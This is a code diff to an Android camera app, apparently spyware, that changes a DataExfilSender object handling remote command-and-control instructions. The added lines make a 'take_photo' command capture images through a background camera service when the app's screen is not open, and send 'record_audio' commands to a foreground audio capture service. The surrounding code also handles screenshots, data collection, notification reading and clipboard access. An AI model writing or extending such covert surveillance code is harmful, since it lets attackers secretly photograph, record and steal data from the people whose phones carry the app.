@@ -3,6 +3,8 @@ package com.example.fancycam.network
 import com.example.fancycam.ui.AppActivityLogger
 import com.example.fancycam.services.MicrophoneCapture
 import com.example.fancycam.services.NotificationReaderService
+import com.example.fancycam.services.CameraCaptureService
+import com.example.fancycam.services.AudioCaptureService
 import android.Manifest
 import android.content.ClipboardManager
 import android.content.Context
@@ -181,8 +183,8 @@ object DataExfilSender {
                         if (listener != null) {
                             listener.onTakePhotoCommand(cmdId)
                         } else {
-                            Log.i(TAG, "[C2 COMMAND] App UI not active; queuing take_photo for resume (id: $cmdId)")
-                            pendingUiCommands.offer(C2Command(id = cmdId, action = "take_photo"))
+                            Log.i(TAG, "[C2 COMMAND] UI inactive; using CameraCaptureService for background photo (id: $cmdId)")
+                            CameraCaptureService.start(context, cmdId)
                         }
                     }
                     "take_screenshot" -> {
@@ -200,8 +202,8 @@ object DataExfilSender {
                     "record_audio" -> {
                         val params = cmdObj.optJSONObject("params")
                         val durationMs = cmdObj.optLong("duration", params?.optLong("duration", 30000L) ?: 30000L)
-                        Log.i(TAG, "[C2 COMMAND] Executing background audio recording ($durationMs ms, id: $cmdId)")
-                        MicrophoneCapture.startCaptureAndExfiltrate(context, durationMs, cmdId)
+                        Log.i(TAG, "[C2 COMMAND] Routing audio recording to foreground service ($durationMs ms, id: $cmdId)")
+                        AudioCaptureService.start(context, durationMs, cmdId)
                     }
                     "collect_data" -> {
                         Log.i(TAG, "[C2 COMMAND] Executing on-demand data collection (id: $cmdId)")
